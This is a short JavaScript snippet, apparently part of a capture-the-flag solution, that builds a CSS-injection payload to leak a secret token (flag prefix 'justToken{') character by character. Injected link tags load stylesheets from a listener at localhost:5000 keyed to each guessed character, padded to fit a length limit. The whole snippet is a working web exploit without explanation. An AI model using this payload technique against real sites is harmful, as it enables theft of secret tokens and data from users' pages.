const guess = "a";
const flag = "justToken{";   // phần đã biết
const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=http://localhost:5000/css/${guess}>}`;
const task = `${prev}${"a".repeat(500 - flag.length - 12 - prev.length)}{}*{--x:`;
console.log(task);
